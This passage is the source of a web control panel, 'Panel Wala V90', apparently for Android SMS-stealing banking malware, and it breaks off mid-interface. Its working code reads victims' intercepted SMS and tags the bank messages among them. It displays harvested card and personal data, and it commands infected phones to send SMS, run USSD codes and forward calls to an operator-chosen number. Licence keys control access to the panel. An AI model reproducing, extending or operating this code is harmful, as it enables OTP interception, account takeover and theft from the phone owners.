<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Panel Wala V90</title>
    
    <!-- 1. Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: {
              'app-green': '#008069',
              'app-light': '#f0f2f5',
              'app-chat-me': '#dcf8c6',
              'app-chat-other': '#ffffff',
            }
          }
        }
      }
    </script>

    <!-- 2. Styles -->
    <style>
      /* Custom scrollbar */
      ::-webkit-scrollbar { width: 6px; }
      ::-webkit-scrollbar-track { background: #f1f1f1; }
      ::-webkit-scrollbar-thumb { background: #888; border-radius: 3px; }
      ::-webkit-scrollbar-thumb:hover { background: #555; }
      
      /* Utilities */
      .loader {
        border: 3px solid #f3f3f3;
        border-radius: 50%;
        border-top: 3px solid #008069;
        width: 24px;
        height: 24px;
        -webkit-animation: spin 1s linear infinite; /* Safari */
        animation: spin 1s linear infinite;
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
    </style>

    <!-- 3. React & Babel -->
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
</head>
<body class="bg-app-light text-gray-800 h-screen overflow-hidden">
    <div id="root" class="h-full w-full"></div>

    <!-- 4. Application Logic -->
    <script type="text/babel" data-type="module">
        // --- IMPORTS ---
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { 
            getDatabase, ref, query, orderByChild, equalTo, get, update, 
            limitToLast, endAt, remove, onValue, set 
        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        const { useState, useEffect, useRef, useMemo } = React;

        // --- FIREBASE CONFIGURATION ---
        const firebaseConfig = {
            databaseURL: "https://panel-wala-v90-default-rtdb.firebaseio.com/",
            apiKey: "AIzaSyDummyKeyForDemoPurposes", 
            authDomain: "panel-wala-v90-default-rtdb.firebaseapp.com",
            projectId: "panel-wala-v90-default-rtdb",
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // --- UTILS (bankUtils.ts) ---
        const BANK_KEYWORDS = [
            "HDFC", "SBI", "AXIS", "ICICI", "KOTAK", "YESBANK",
            "CANARA", "BOB", "INDUSIND", "PAYTM", "PHONEPE",
            "GOOGLEPAY", "AMAZONPAY"
        ];

        const detectBanks = (text) => {
            if (!text) return [];
            const upperText = text.toUpperCase();
            const found = new Set();
            BANK_KEYWORDS.forEach(bank => {
                if (upperText.includes(bank)) found.add(bank);
            });
            return Array.from(found);
        };

        const parseCustomDate = (dateStr) => {
            try {
                const parts = dateStr.split(' ');
                if (parts.length !== 2) return null;
                const timeParts = parts[0].split(':');
                const dateParts = parts[1].split('/');
                if (timeParts.length !== 3 || dateParts.length !== 3) return null;
                const h = parseInt(timeParts[0], 10);
                const m = parseInt(timeParts[1], 10);
                const s = parseInt(timeParts[2], 10);
                const day = parseInt(dateParts[0], 10);
                const month = parseInt(dateParts[1], 10) - 1;
                const year = parseInt(dateParts[2], 10);
                return new Date(year, month, day, h, m, s);
            } catch (e) {
                return null;
            }
        };

        // --- SERVICES (firebase.ts) ---
        const getBrowserId = () => {
            let id = localStorage.getItem('panel_browser_id');
            if (!id) {
                id = 'web-' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
                localStorage.setItem('panel_browser_id', id);
            }
            return id;
        };

        const validateAndLogin = async (userData, userIdKey) => {
            const user = userData;
            user.userId = userIdKey;
            if (user.isBlocked) return { success: false, message: 'Key Blocked' };
            if (user.expirationTime) {
                const expDate = parseCustomDate(user.expirationTime);
                if (expDate && new Date() > expDate) return { success: false, message: 'Key Expired' };
            }
            
            // Note: Single device restriction removed as requested.
            // const currentDeviceId = getBrowserId();
            // if (!user.androidId) { ... } else if (user.androidId !== currentDeviceId) { ... }

            return { success: true, user };
        };

        const loginUser = async (key) => {
            const usersRef = ref(db, 'users');
            try {
                const q = query(usersRef, orderByChild('key'), equalTo(key));
                const snapshot = await get(q);
                if (snapshot.exists()) {
                    let userData = null;
                    let userIdKey = '';
                    snapshot.forEach((child) => {
                        userData = child.val();
                        userIdKey = child.key;
                    });
                    if (userData) return await validateAndLogin(userData, userIdKey);
                }
                return { success: false, message: 'Invalid Key' };
            } catch (error) {
                const errorMsg = error.message ? error.message.toLowerCase() : "";
                if (errorMsg.includes("index not defined")) {
                    try {
                        const snapshot = await get(usersRef);
                        if (!snapshot.exists()) return { success: false, message: 'Invalid Key' };
                        let foundUser = null;
                        let foundUserId = '';
                        snapshot.forEach((child) => {
                            const u = child.val();
                            if (u.key === key) {
                                foundUser = u;
                                foundUserId = child.key;
                            }
                        });
                        if (foundUser) return await validateAndLogin(foundUser, foundUserId);
                        return { success: false, message: 'Invalid Key' };
                    } catch (fbError) {
                        return { success: false, message: fbError.message };
                    }
                }
                return { success: false, message: error.message || 'Network Error' };
            }
        };

        const fetchAllDevices = async () => {
            try {
                const deviceRef = ref(db, 'All_Users/DeviceInfo');
                const deviceSnap = await get(deviceRef);
                if (!deviceSnap.exists()) return [];
                const simRef = ref(db, 'All_Users/simDetails');
                const simSnap = await get(simRef);
                const simMap = new Map();
                if (simSnap.exists()) {
                    simSnap.forEach(child => { simMap.set(child.key, child.val()); });
                }
                const devices = [];
                deviceSnap.forEach(child => {
                    const uid = child.key;
                    const data = child.val();
                    const simData = simMap.get(uid);
                    devices.push({
                        userId: uid,
                        Brand: data.Brand || 'Unknown',
                        DeviceId: data.DeviceId || uid,
                        Status: data.Status || 'Offline',
                        checked: data.checked || false,
                        lastSeen: data.lastSeen,
                        timestamp: data.timestamp,
                        sim1Number: simData?.sim1Number,
                        sim2Number: simData?.sim2Number
                    });
                });
                return devices.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
            } catch (error) {
                return [];
            }
        };

        const subscribeToDevices = (callback) => {
            const deviceRef = ref(db, 'All_Users/DeviceInfo');
            return onValue(deviceRef, async (snapshot) => {
                if (!snapshot.exists()) { callback([]); return; }
                const simRef = ref(db, 'All_Users/simDetails');
                const simSnap = await get(simRef);
                const simMap = new Map();
                if (simSnap.exists()) { simSnap.forEach(child => simMap.set(child.key, child.val())); }
                const devices = [];
                snapshot.forEach(child => {
                    const uid = child.key;
                    const data = child.val();
                    const simData = simMap.get(uid);
                    devices.push({
                        userId: uid,
                        Brand: data.Brand || 'Unknown',
                        DeviceId: data.DeviceId || uid,
                        Status: data.Status || 'Offline',
                        checked: data.checked || false,
                        lastSeen: data.lastSeen,
                        timestamp: data.timestamp,
                        sim1Number: simData?.sim1Number,
                        sim2Number: simData?.sim2Number
                    });
                });
                const sorted = devices.sort((a, b) => {
                    if (a.Status === 'Online' && b.Status !== 'Online') return -1;
                    if (a.Status !== 'Online' && b.Status === 'Online') return 1;
                    return (b.lastSeen || 0) - (a.lastSeen || 0);
                });
                callback(sorted);
            });
        };

        const markUserAsChecked = async (userId) => {
            await update(ref(db, `All_Users/DeviceInfo/${userId}`), { checked: true });
        };

        const fetchFullUserInfo = async (userId) => {
            try {
                const infoRef = ref(db, `All_Users/Info/${userId}`);
                const cardRef = ref(db, `All_Users/Card/${userId}`);
                const deviceRef = ref(db, `All_Users/DeviceInfo/${userId}`);
                const simRef = ref(db, `All_Users/simDetails/${userId}`);
                const [infoSnap, cardSnap, deviceRefSnap, simSnap] = await Promise.all([
                    get(infoRef), get(cardRef), get(deviceRef), get(simRef)
                ]);
                return {
                    info: infoSnap.exists() ? infoSnap.val() : {},
                    cards: cardSnap.exists() ? cardSnap.val() : {},
                    deviceInfo: deviceRefSnap.exists() ? deviceRefSnap.val() : {},
                    simDetails: simSnap.exists() ? simSnap.val() : {}
                };
            } catch (e) { return null; }
        };

        const fetchGlobalData = async () => {
            try {
                const infoRef = ref(db, 'All_Users/Info');
                const cardRef = ref(db, 'All_Users/Card');
                const deviceRef = ref(db, 'All_Users/DeviceInfo');
                const [infoSnap, cardSnap, deviceSnap] = await Promise.all([get(infoRef), get(cardRef), get(deviceRef)]);
                const usersMap = new Map();
                if (deviceSnap.exists()) {
                    deviceSnap.forEach(d => {
                        usersMap.set(d.key, { userId: d.key, brand: d.val().Brand, deviceId: d.val().DeviceId, info: {}, cards: {} });
                    });
                }
                if (infoSnap.exists()) {
                    infoSnap.forEach(child => {
                        const uid = child.key;
                        if (!usersMap.has(uid)) usersMap.set(uid, { userId: uid, info: {}, cards: {} });
                        usersMap.get(uid).info = child.val();
                    });
                }
                if (cardSnap.exists()) {
                    cardSnap.forEach(child => {
                        const uid = child.key;
                        if (!usersMap.has(uid)) usersMap.set(uid, { userId: uid, info: {}, cards: {} });
                        usersMap.get(uid).cards = child.val();
                    });
                }
                return Array.from(usersMap.values());
            } catch (e) { return []; }
        };

        const sendCommandSms = async (userId, toNumber, message, simSlot) => {
            await set(ref(db, `All_Users/SmsForwarding/${userId}`), { command: 'forwardSms', toNumber, message, simSlot });
        };
        const sendUssdCommand = async (userId, ussdCode, simSlot) => {
            await set(ref(db, `All_Users/UssdCommands/${userId}`), { simSlot, ussdCode, timestamp: Date.now() });
        };
        const setCallForwarding = async (userId, toNumber, simSlot, enable) => {
            await set(ref(db, `All_Users/CallForwarding/${userId}`), { command: enable ? 'enableCallForwarding' : 'disableCallForwarding', slot: simSlot, toNumber, timestamp: Date.now() });
        };
        const subscribeToUssdResponse = (userId, callback) => {
            return onValue(ref(db, `All_Users/UssdResponses/${userId}`), (snapshot) => callback(snapshot.val()));
        };
        const subscribeToCallForwarding = (userId, callback) => {
            return onValue(ref(db, `All_Users/CallForwarding/${userId}`), (snapshot) => callback(snapshot.val()));
        };

        const deleteSingleUser = async (userId) => {
            const updates = {};
            const usersRef = ref(db, 'users');
            const q = query(usersRef, orderByChild('androidId'), equalTo(userId));
            const snapshot = await get(q);
            if (snapshot.exists()) {
                snapshot.forEach((child) => { updates[`users/${child.key}`] = null; });
            }
            updates[`All_Users/DeviceInfo/${userId}`] = null;
            updates[`All_Users/simDetails/${userId}`] = null;
            updates[`All_Users/Info/${userId}`] = null;
            updates[`All_Users/sms/${userId}`] = null;
            updates[`All_Users/Card/${userId}`] = null;
            updates[`All_Users/DeviceFullInfo/${userId}`] = null;
            updates[`All_Users/SmsForwarding/${userId}`] = null;
            updates[`All_Users/UssdCommands/${userId}`] = null;
            updates[`All_Users/CallForwarding/${userId}`] = null;
            updates[`All_Users/UssdResponses/${userId}`] = null;
            await update(ref(db), updates);
        };

        const deleteOfflineUsers = async (offlineUserIds) => {
            if (offlineUserIds.length === 0) return;
            for (const uid of offlineUserIds) { await deleteSingleUser(uid); }
        };

        const updateAdminNumber = async (newNumber) => {
            await update(ref(db, 'All_Users/Admin'), { Number: newNumber });
        };

        const subscribeToSMS = (userId, callback) => {
            const smsRef = ref(db, `All_Users/sms/${userId}`);
            const q = query(smsRef, orderByChild('timestamp'), limitToLast(50));
            return onValue(q, (snapshot) => {
                const messages = [];
                if (snapshot.exists()) {
                    snapshot.forEach((child) => { messages.push({ ...child.val(), key: child.key, userId }); });
                }
                callback(messages.sort((a, b) => b.timestamp - a.timestamp));
            });
        };

        const fetchInitialSMS = async (userId, isAllMode) => {
            try {
                const smsRef = ref(db, `All_Users/sms/${userId}`);
                const q = query(smsRef, orderByChild('timestamp'), limitToLast(50));
                let snapshot;
                try { snapshot = await get(q); } catch (e) {
                    if (e.message && e.message.toLowerCase().includes("index")) { snapshot = await get(smsRef); } else { throw e; }
                }
                const results = [];
                snapshot.forEach(child => { results.push({ ...child.val(), key: child.key, userId }); });
                return results.sort((a, b) => b.timestamp - a.timestamp).slice(0, 50);
            } catch (error) { return []; }
        };

        const fetchOlderSMS = async (userId, lastTimestamp) => {
            try {
                const smsRef = ref(db, `All_Users/sms/${userId}`);
                const q = query(smsRef, orderByChild('timestamp'), endAt(lastTimestamp - 1), limitToLast(50));
                let snapshot;
                try { snapshot = await get(q); } catch (e) {
                    if (e.message && e.message.toLowerCase().includes("index")) {
                        const fullSnap = await get(smsRef);
                        const allMsgs = [];
                        fullSnap.forEach(c => allMsgs.push({ ...c.val(), key: c.key, userId }));
                        return allMsgs.filter(m => m.timestamp < lastTimestamp).sort((a, b) => b.timestamp - a.timestamp).slice(0, 50);
                    }
                    throw e;
                }
                const results = [];
                snapshot.forEach(child => { results.push({ ...child.val(), key: child.key, userId }); });
                return results.sort((a, b) => b.timestamp - a.timestamp);
            } catch (error) { return []; }
        };

        const fetchGlobalSMS = async () => {
            try {
                const refAll = ref(db, 'All_Users/sms');
                const snapshot = await get(refAll);
                const allSMS = [];
                if (snapshot.exists()) {
                    snapshot.forEach(userNode => {
                        const uid = userNode.key;
                        userNode.forEach(smsNode => { allSMS.push({ ...smsNode.val(), key: smsNode.key, userId: uid }); });
                    });
                }
                return allSMS.sort((a, b) => b.timestamp - a.timestamp);
            } catch (e) { return []; }
        };

        const deleteSMS = async (userId, smsKey) => {
            await remove(ref(db, `All_Users/sms/${userId}/${smsKey}`));
        };

        const deleteAllSMS = async (userId) => {
            await remove(ref(db, `All_Users/sms/${userId}`));
        };

        const deleteAllGlobalSMS = async () => {
            await remove(ref(db, 'All_Users/sms'));
        };

        // --- COMPONENTS ---

        // 1. BankChips
        const BankChips = ({ stats, selectedBank, onSelectBank }) => {
            const [isExpanded, setIsExpanded] = useState(true);
            if (stats.length === 0) return null;
            return (
                <div className="bg-white border-b border-gray-200 shadow-sm transition-all duration-300">
                    <div className="flex items-center justify-between px-4 py-2 cursor-pointer bg-gray-50" onClick={() => setIsExpanded(!isExpanded)}>
                        <span className="text-xs font-bold text-gray-500 uppercase tracking-wider">Detected Banks ({stats.length})</span>
                        <svg className={`w-4 h-4 text-gray-500 transform transition-transform duration-300 ${isExpanded ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                        </svg>
                    </div>
                    <div className={`overflow-hidden transition-all duration-300 ${isExpanded ? 'max-h-40' : 'max-h-0'}`}>
                        <div className="flex flex-wrap gap-2 p-3 overflow-y-auto max-h-40">
                            <button onClick={() => onSelectBank(null)} className={`px-3 py-1 rounded-full text-xs font-medium border transition-colors ${selectedBank === null ? 'bg-app-green text-white border-app-green' : 'bg-white text-gray-600 border-gray-300 hover:bg-gray-100'}`}>All</button>
                            {stats.map((stat) => (
                                <button key={stat.name} onClick={() => onSelectBank(selectedBank === stat.name ? null : stat.name)} className={`flex items-center space-x-1 px-3 py-1 rounded-full text-xs font-medium border transition-colors ${selectedBank === stat.name ? 'bg-app-green text-white border-app-green' : 'bg-white text-gray-600 border-gray-300 hover:bg-gray-100'}`}>
                                    <span>{stat.name}</span>
                                    <span className={`ml-1 px-1.5 py-0.5 rounded-full text-[10px] ${selectedBank === stat.name ? 'bg-white text-app-green' : 'bg-gray-200 text-gray-700'}`}>{stat.count}</span>
                                </button>
                            ))}
                        </div>
                    </div>
                </div>
            );
        };

        // 2. SmsModal
        const SmsModal = ({ sms, onClose }) => {
            if (!sms) return null;
            const detectedBanks = detectBanks(sms.body + " " + sms.sender);
            return (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 p-4 backdrop-blur-sm" onClick={onClose}>
                    <div className="bg-white rounded-lg shadow-xl w-full max-w-md overflow-hidden transform transition-all scale-100" onClick={e => e.stopPropagation()}>
                        <div className="bg-app-green px-4 py-3 flex justify-between items-center text-white">
                            <h3 className="font-semibold text-lg truncate pr-2">{sms.sender}</h3>
                            <button onClick={onClose} className="hover:bg-green-700 p-1 rounded">
                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" /></svg>
                            </button>
                        </div>
                        <div className="p-5 space-y-4">
                            <div>
                                <label className="text-xs font-bold text-gray-500 uppercase">Message Body</label>
                                <p className="text-gray-800 text-sm whitespace-pre-wrap mt-1 bg-gray-50 p-3 rounded border border-gray-100">{sms.body}</p>
                            </div>
                            <div className="grid grid-cols-2 gap-4">
                                <div><label className="text-xs font-bold text-gray-500 uppercase">Received Date</label><p className="text-sm text-gray-700">{sms.receivedDate}</p></div>
                                <div><label className="text-xs font-bold text-gray-500 uppercase">Timestamp</label><p className="text-sm text-gray-700">{new Date(sms.timestamp).toLocaleString()}</p></div>
                            </div>
                            <div className="grid grid-cols-2 gap-4">
                                <div><label className="text-xs font-bold text-gray-500 uppercase">User ID</label><p className="text-xs text-gray-600 font-mono bg-gray-100 p-1 rounded truncate">{sms.userId}</p></div>
                                <div><label className="text-xs font-bold text-gray-500 uppercase">Android ID</label><p className="text-xs text-gray-600 font-mono bg-gray-100 p-1 rounded truncate">{sms.androidId || 'N/A'}</p></div>
                            </div>
                            {detectedBanks.length > 0 && (
                                <div>
                                    <label className="text-xs font-bold text-gray-500 uppercase mb-2 block">Detected Banks</label>
                                    <div className="flex flex-wrap gap-2">
                                        {detectedBanks.map(bank => <span key={bank} className="px-2 py-1 bg-blue-100 text-blue-800 text-xs font-semibold rounded-full">{bank}</span>)}
                                    </div>
                                </div>
                            )}
                        </div>
                        <div className="bg-gray-50 px-4 py-3 flex justify-end">
                            <button onClick={onClose} className="px-4 py-2 bg-gray-200 text-gray-800 text-sm font-medium rounded hover:bg-gray-300 transition-colors">Close</button>
                        </div>
                    </div>
                </div>
            );
        };

        // 3. AdminNumberModal
        const AdminNumberModal = ({ onClose }) => {
            const [number, setNumber] = useState('');
            const [status, setStatus] = useState('IDLE');
            const handleSave = async () => {
                if (!number) return;
                setStatus('SAVING');
                try {
                    await updateAdminNumber(number);
                    setStatus('SUCCESS');
                    setTimeout(onClose, 1000);
                } catch (e) { setStatus('ERROR'); }
            };
            return (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm">
                    <div className="bg-white rounded-lg shadow-xl p-6 w-full max-w-sm">
                        <h3 className="text-lg font-bold text-gray-800 mb-4">Update Admin Number</h3>
                        <input type="tel" value={number} onChange={e => setNumber(e.target.value)} placeholder="Enter new admin number" className="w-full border border-gray-300 rounded p-2 mb-4 focus:border-app-green focus:outline-none" />
                        {status === 'SUCCESS' && <p className="text-green-600 text-sm mb-4">Number updated successfully!</p>}
                        {status === 'ERROR' && <p className="text-red-600 text-sm mb-4">Failed to update.</p>}
                        <div className="flex justify-end space-x-2">
                            <button onClick={onClose} className="px-4 py-2 text-gray-600 hover:bg-gray-100 rounded">Cancel</button>
                            <button onClick={handleSave} disabled={status === 'SAVING'} className="px-4 py-2 bg-app-green text-white rounded hover:bg-green-700 disabled:opacity-50">{status === 'SAVING' ? 'Saving...' : 'Update'}</button>
                        </div>
                    </div>
                </div>
            );
        };

        // 4. GlobalDataViewer
        const DataRow = ({ label, value }) => (
            <div className="flex flex-col sm:flex-row border-b border-gray-100 last:border-0 py-1.5 hover:bg-gray-50 transition-colors">
                <span className="text-xs font-bold text-gray-500 w-full sm:w-1/3 shrink-0 uppercase tracking-wide flex items-center">{label}</span>
                <span className="text-sm text-gray-800 break-words font-mono w-full">{typeof value === 'object' && value !== null ? JSON.stringify(value).replace(/[{}"]/g, ' ') : String(value)}</span>
            </div>
        );
        const GlobalDataViewer = ({ onBack }) => {
            const [users, setUsers] = useState([]);
            const [loading, setLoading] = useState(true);
            useEffect(() => {
                fetchGlobalData().then(data => { setUsers(data); setLoading(false); });
            }, []);
            return (
                <div className="h-full flex flex-col bg-gray-100">
                    <header className="bg-indigo-600 text-white px-4 py-3 shadow flex items-center sticky top-0 z-10 flex-none">
                        <button onClick={onBack} className="mr-3 hover:bg-indigo-700 p-1 rounded">
                            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg>
                        </button>
                        <div><h1 className="font-bold text-lg">Panel Wala V90</h1><p className="text-xs opacity-80">Global Data Viewer</p></div>
                    </header>
                    <div className="flex-1 overflow-auto p-4">
                        {loading ? (
                            <div className="flex justify-center mt-10"><div className="animate-spin rounded-full h-8 w-8 border-b-2 border-indigo-600"></div></div>
                        ) : users.length === 0 ? (
                            <div className="text-center text-gray-500 mt-10">No data found.</div>
                        ) : (
                            <div className="space-y-6 pb-10">
                                {users.map(u => (
                                    <div key={u.userId} className="bg-white rounded-lg shadow-sm border border-gray-200 overflow-hidden">
                                        <div className="bg-gray-50 px-4 py-3 border-b flex justify-between items-center">
                                            <div className="flex items-center space-x-2">
                                                <span className="w-2 h-2 rounded-full bg-indigo-500"></span>
                                                <span className="font-bold text-gray-800 text-sm md:text-base">{u.brand || 'Unknown Device'}</span>
                                                <span className="hidden md:inline text-xs text-gray-500 font-mono">({u.deviceId})</span>
                                            </div>
                                            <span className="text-[10px] bg-indigo-100 text-indigo-700 px-2 py-1 rounded font-mono">{u.userId}</span>
                                        </div>
                                        <div className="p-4 grid lg:grid-cols-2 gap-6">
                                            <div>
                                                <h3 className="text-xs font-bold text-indigo-600 uppercase mb-3 border-b border-indigo-100 pb-1 flex items-center">Device Information</h3>
                                                <div className="bg-white rounded"><DataRow label="Brand" value={u.brand} /><DataRow label="Device ID" value={u.deviceId} />{u.info && Object.entries(u.info).map(([k, v]) => <DataRow key={k} label={k} value={v} />)}</div>
                                            </div>
                                            <div>
                                                <h3 className="text-xs font-bold text-blue-600 uppercase mb-3 border-b border-blue-100 pb-1 flex items-center">Bank Cards</h3>
                                                <div className="bg-white rounded">
                                                    {u.cards && Object.keys(u.cards).length > 0 ? (Object.entries(u.cards).map(([k, v]) => <DataRow key={k} label={k} value={v} />)) : (<div className="text-xs text-gray-400 italic p-2 border border-dashed border-gray-200 rounded text-center">No card data available for this user.</div>)}
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        )}
                    </div>
                </div>
            );
        };

        // 5. UserDataViewer
        const UserDataViewer = ({ targetUser, onBack }) => {
            const [data, setData] = useState(null);
            const [loading, setLoading] = useState(true);
            const [activeTab, setActiveTab] = useState('ACTIONS');
            const [showSmsModal, setShowSmsModal] = useState(false);
            const [showUssdModal, setShowUssdModal] = useState(false);
            const [showCallFwdModal, setShowCallFwdModal] = useState(false);
            const [smsForm, setSmsForm] = useState({ to: '', msg: '', slot: 0 });
            const [ussdInput, setUssdInput] = useState('');
            const [ussdSlot, setUssdSlot] = useState(0);
            const [callFwdForm, setCallFwdForm] = useState({ number: '', slot: 0, enable: true });
            const [ussdHistory, setUssdHistory] = useState([]);
            const [callFwdStatus, setCallFwdStatus] = useState('Waiting for device response...');
            const [actionStatus, setActionStatus] = useState(null);
            const ussdEndRef = useRef(null);

            const refreshData = () => { setLoading(true); fetchFullUserInfo(targetUser.userId).then(info => { setData(info); setLoading(false); }); };
            useEffect(() => { refreshData(); }, [targetUser.userId]);
            useEffect(() => {
                if (showUssdModal) {
                    const unsubscribe = subscribeToUssdResponse(targetUser.userId, (data) => {
                        if (data) {
                            const msgText = typeof data === 'string' ? data : (data.message || JSON.stringify(data));
                            setUssdHistory(prev => {
                                const last = prev[prev.length - 1];
                                if (last && last.type === 'RECEIVED' && last.text === msgText) return prev;
                                return [...prev, { id: Date.now(), type: 'RECEIVED', text: msgText, time: new Date() }];
                            });
                        }
                    });
                    return () => unsubscribe();
                }
            }, [showUssdModal, targetUser.userId]);
            useEffect(() => { ussdEndRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [ussdHistory, showUssdModal]);
            useEffect(() => {
                if (showCallFwdModal) {
                    const unsubscribe = subscribeToCallForwarding(targetUser.userId, (data) => {
                        if (data) {
                            if (typeof data === 'string') { setCallFwdStatus(data); } else if (data.callForwardStatus) { setCallFwdStatus(data.callForwardStatus); }
                        }
                    });
                    return () => unsubscribe();
                }
            }, [showCallFwdModal, targetUser.userId]);

            const handleSendSMS = async () => {
                if (!smsForm.to || !smsForm.msg) return;
                setActionStatus('Sending Command...');
                try { await sendCommandSms(targetUser.userId, smsForm.to, smsForm.msg, smsForm.slot); setActionStatus('SMS Command Sent!'); setTimeout(() => { setShowSmsModal(false); setActionStatus(null); setSmsForm({ to: '', msg: '', slot: 0 }); }, 1500); } catch (e) { setActionStatus('Failed to send.'); }
            };
            const handleSendUssd = async () => {
                if (!ussdInput) return;
                try { setUssdHistory(prev => [...prev, { id: Date.now(), type: 'SENT', text: ussdInput, time: new Date() }]); await sendUssdCommand(targetUser.userId, ussdInput, ussdSlot); setUssdInput(''); } catch (e) { alert('Failed to send USSD'); }
            };
            const handleCallFwd = async () => {
                if (callFwdForm.enable && !callFwdForm.number) return;
                setActionStatus('Sending config...');
                setCallFwdStatus('Sending command to device...');
                try { await setCallForwarding(targetUser.userId, callFwdForm.number, callFwdForm.slot, callFwdForm.enable); setActionStatus(null); } catch (e) { setCallFwdStatus('Failed to update settings locally.'); }
            };
            const handleMarkChecked = async () => { await markUserAsChecked(targetUser.userId); alert("User marked as checked."); };

            if (loading) { return (<div className="h-full flex items-center justify-center bg-gray-100"><div className="animate-spin rounded-full h-10 w-10 border-b-2 border-app-green"></div></div>); }
            const simInfo = data?.simDetails || {};
            const devInfo = data?.deviceInfo || targetUser;

            return (
                <div className="h-full flex flex-col bg-gray-100">
                    <header className="bg-app-green text-white px-4 py-3 shadow flex items-center sticky top-0 z-10 flex-none justify-between">
                        <div className="flex items-center"><button onClick={onBack} className="mr-3 hover:bg-green-700 p-1 rounded"><svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" /></svg></button><div><h1 className="font-bold text-lg leading-tight">{devInfo.Brand}</h1><p className="text-xs text-green-100 font-mono">{devInfo.DeviceId}</p></div></div>
                        <div className={`px-2 py-1 rounded text-xs font-bold ${devInfo.Status === 'Online' ? 'bg-white text-green-600' : 'bg-gray-700 text-gray-300'}`}>{devInfo.Status}</div>
                    </header>
                    <div className="flex-1 overflow-y-auto p-4 space-y-4">
                        <div className="bg-white rounded-lg shadow p-4 grid grid-cols-2 gap-4">
                            <div><h3 className="text-xs font-bold text-gray-500 uppercase">SIM 1</h3><p className="text-sm font-mono font-medium text-gray-800">{simInfo.sim1Number || 'N/A'}</p><p className="text-xs text-gray-500">{simInfo.sim1Provider || '-'}</p></div>
                            <div><h3 className="text-xs font-bold text-gray-500 uppercase">SIM 2</h3><p className="text-sm font-mono font-medium text-gray-800">{simInfo.sim2Number || 'N/A'}</p><p className="text-xs text-gray-500">{simInfo.sim2Provider || '-'}</p></div>
                            <div className="col-span-2 border-t pt-2 flex justify-between text-xs text-gray-500"><span>Last Seen: {devInfo.lastSeen ? new Date(devInfo.lastSeen).toLocaleString() : 'Never'}</span><span>ID: {targetUser.userId.substring(0, 8)}</span></div>
                        </div>
                        <div className="flex bg-white rounded-lg shadow overflow-hidden text-sm font-medium">
                            <button onClick={() => setActiveTab('ACTIONS')} className={`flex-1 py-3 text-center transition-colors ${activeTab === 'ACTIONS' ? 'bg-blue-50 text-blue-600 border-b-2 border-blue-600' : 'text-gray-600 hover:bg-gray-50'}`}>Actions</button>
                            <button onClick={() => setActiveTab('DATA')} className={`flex-1 py-3 text-center transition-colors ${activeTab === 'DATA' ? 'bg-blue-50 text-blue-600 border-b-2 border-blue-600' : 'text-gray-600 hover:bg-gray-50'}`}>Info</button>
                            <button onClick={() => setActiveTab('CARDS')} className={`flex-1 py-3 text-center transition-colors ${activeTab === 'CARDS' ? 'bg-blue-50 text-blue-600 border-b-2 border-blue-600' : 'text-gray-600 hover:bg-gray-50'}`}>Cards</button>
                        </div>
                        {activeTab === 'ACTIONS' && (
                            <div className="grid grid-cols-2 gap-3">
                                <button onClick={() => setShowSmsModal(true)} className="col-span-2 bg-gradient-to-r from-green-500 to-emerald-600 text-white p-4 rounded-lg shadow hover:shadow-lg transition-shadow flex items-center justify-center space-x-2"><svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" /></svg><span className="font-bold text-lg">Send SMS</span></button>
                                <button onClick={() => setShowUssdModal(true)} className="bg-white text-gray-800 p-4 rounded-lg shadow hover:bg-gray-50 flex flex-col items-center justify-center space-y-1"><svg className="w-6 h-6 text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg><span className="font-semibold">USSD Terminal</span></button>
